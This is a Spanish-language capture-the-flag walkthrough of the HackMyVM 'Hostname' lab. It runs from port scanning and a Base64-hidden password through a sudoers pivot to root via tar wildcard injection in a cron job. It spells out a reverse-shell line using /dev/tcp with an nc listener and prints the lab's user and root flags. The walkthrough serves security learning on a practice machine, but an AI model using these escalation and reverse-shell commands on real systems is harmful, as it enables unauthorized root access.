---
icon: flag
---

# Hostname HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 03:12 EDT
Nmap scan report for 192.168.1.154
Host is up (0.00030s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Panda
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:4A:DF:6D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

Si entramos en el puerto `80` veremos que esta alojada una pagina web en la que contiene lo siguiente:

<figure><img src="../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Veremos que tenemos que introducir una palabra secreta para descubrir algo, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.154/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1621]
/assets               (Status: 403) [Size: 153]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Pero no veremos nada interesante, ahora si inspeccionamos el codigo veremos este bloque de `HTML`:

```html
 <div class="form-group">
        <p class="alert">Give Some Input..!!</p>
        <!-- Kung Fu Panda -->
        <button class="btn" name="username" disabled="po">Read</button>
    </div>
</form>
    <link rel="stylesheet" href="[./assets/cool.css](view-source:http://192.168.1.154/assets/cool.css)"><br><br>
    <h2 style="font-size:4vw"><span>I</span>M<span>POSSIBLE</span></h2>
    <script crossorigin="S3VuZ19GdV9QNG5kYQ==" src='[https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js](view-source:https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js)'></script>
    <script src="[./assets/script.js](view-source:http://192.168.1.154/assets/script.js)"></script>
</body>
```

Vemos que el nombre de usuario es `po` por lo que parece:

```html
<button class="btn" name="username" disabled="po">Read</button>
```

Y que la posible contraseña a lo mejor puede ser esta parte de aqui:

```html
<script crossorigin="S3VuZ19GdV9QNG5kYQ==" src='[https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js](view-source:https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js)'></script>
```

Vamos a decodificar ese `Base64` de la siguiente forma:

```shell
echo "S3VuZ19GdV9QNG5kYQ==" | base64 -d
```

Info:

```
Kung_Fu_P4nda
```

Por lo que vemos esa puede ser la clave secreta, vamos a ver si funciona metiendolo en la pagina.

Pero veremos que no funciona el boton, si volvemos a inspeccionar el codigo vemos que pone `dissable` en el boton una funciona que puede estar dando fallo a la hora de clickarlo, por lo que vamos a eliminar dicha funcion desde el codigo inspeccionandolo y enviaremos la palabra secreta:

De estar asi:

<figure><img src="../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Ha estar asi:

<figure><img src="../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

Ahora pondremos la palabra secreta y le daremos al boton, con ello veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado y nos muestra otra palabra la cual puede ser la contraseña del usuario `po` para conectarnos por `SSH`, por lo que haremos lo siguiente:

### SSH

```shell
ssh po@<IP>
```

Metemos como contraseña `!ts-bl4nk` y veremos que estamos dentro.

## Escalate user oogway

Vamos a enumerar el sistema lanzando el famosos script de `linpeas.sh`, primero nos lo descargaremos en nuestra maquina `host` de la siguiente forma:

URL = [GitHub Linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```shell
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Y ahora abriremos un servidor de `python3` para pasarnoslo de la siguiente forma:

> HOST

```shell
python3 -m http.server 80
```

> MAQUINA VICTIMA

```shell
wget http://<IP>/linpeas.sh
```

Echo esto le daremos permisos de ejecuccion al script y seguidamente lo ejecutaremos de una:

```shell
chmod +x linpeas.sh | bash linpeas.sh
```

Echo esto veremos una cosa bastante interesante:

<figure><img src="../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

Vemos que en la carpeta `sudoers.d` del archivo que contiene llamado `po` esta la siguiente linea, por lo que vamos a probar a realizar lo siguiente:

```shell
sudo -u oogway -h HackMyVM /bin/bash
```

Info:

```
oogway@hostname:/home/po$ whoami
oogway
```

Con esto veremos que funciono correctamente y seremos dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
081ecc5e6dd6ba0d150fc4bc0e62ec50
```

## Escalate Privileges

Vamos a ver los procesos que pasan en la maquina con una herramienta llamada `pspy64`, nos la descargaremos en el siguiente link:

URL = [Download pspy64 GitHub](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

Una vez descargada, vamos abrirnos un servidor de `python3` para pasarnos la herramienta:

> HOST

```shell
python3 -m http.server 80
```

> MAQUINA VICTIMA

```shell
wget http://<IP>/pspy64
```

Echo esto le daremos permisos de ejecuccion al script:

```shell
chmod +x pspy64
```

Ahora vamos a ejecutarlo de la siguiente forma:

```shell
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/04/20 03:41:55 CMD: UID=1001  PID=13705  | ./pspy64 
2025/04/20 03:41:55 CMD: UID=0     PID=13692  | 
2025/04/20 03:41:55 CMD: UID=1001  PID=13625  | /bin/bash 
2025/04/20 03:41:55 CMD: UID=0     PID=13624  | sudo -u oogway -h HackMyVM /bin/bash 
2025/04/20 03:41:55 CMD: UID=0     PID=13607  | 
2025/04/20 03:41:55 CMD: UID=0     PID=818    | 
2025/04/20 03:41:55 CMD: UID=1000  PID=749    | -bash 
2025/04/20 03:41:55 CMD: UID=1000  PID=748    | sshd: po@pts/0       
2025/04/20 03:41:55 CMD: UID=1000  PID=739    | (sd-pam) 
2025/04/20 03:41:55 CMD: UID=1000  PID=738    | /lib/systemd/systemd --user 
2025/04/20 03:41:55 CMD: UID=0     PID=735    | sshd: po [priv]  
...........................<RESTO DE PROCESOS>.....................................
2025/04/20 03:41:55 CMD: UID=0     PID=728    | 
2025/04/20 03:41:55 CMD: UID=0     PID=3      | 
2025/04/20 03:41:55 CMD: UID=0     PID=2      | 
2025/04/20 03:41:55 CMD: UID=0     PID=1      | /sbin/init 
2025/04/20 03:42:01 CMD: UID=0     PID=13713  | /usr/sbin/CRON -f 
2025/04/20 03:42:01 CMD: UID=0     PID=13714  | /usr/sbin/CRON -f 
2025/04/20 03:42:01 CMD: UID=0     PID=13715  | /bin/sh -c      cd /opt/secret/ && tar -zcf /var/backups/secret.tgz * 
2025/04/20 03:42:01 CMD: UID=0     PID=13716  | tar -zcf /var/backups/secret.tgz * 
2025/04/20 03:42:01 CMD: UID=0     PID=13717  | /bin/sh -c gzip 
2025/04/20 03:43:01 CMD: UID=0     PID=13718  | /usr/sbin/CRON -f 
2025/04/20 03:43:01 CMD: UID=0     PID=13719  | /usr/sbin/CRON -f 
2025/04/20 03:43:01 CMD: UID=0     PID=13720  | /bin/sh -c      cd /opt/secret/ && tar -zcf /var/backups/secret.tgz * 
2025/04/20 03:43:01 CMD: UID=0     PID=13721  | tar -zcf /var/backups/secret.tgz * 
2025/04/20 03:43:01 CMD: UID=0     PID=13722  | /bin/sh -c gzip 
```

Veremos varias cosas interesantes entre ellas que se esta ejecutando un `crontab` y esta haciendo lo siguiente:

```shell
cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *
```

Por lo que veremos aqui se podria intentar hacer un ataque llamado `Tar arbitrary command execution`, y podremos hacerlo de la siguiente forma:

URL = [Referencia de la vulnerabilidad y el ataque](https://medium.com/@althubianymalek/linux-privilege-escalation-using-tar-wildcards-a-step-by-step-guide-55771aae063f)

```shell
cd /opt/secret/
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=bash\ shell.sh
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" > shell.sh
```

Ahora tendremos que esperar estando a la escucha:

```shell
nc -lvnp <PORT>
```

Una vez esperado un rato, si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.154] 53294
bash: cannot set terminal process group (15964): Inappropriate ioctl for device
bash: no job control in this shell
root@hostname:/opt/secret# whoami
whoami
root
```

Por lo que vemos habremos obtenido acceso a una `shell` de `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
d5806296126a30ceebeaa172ff9c9151
```
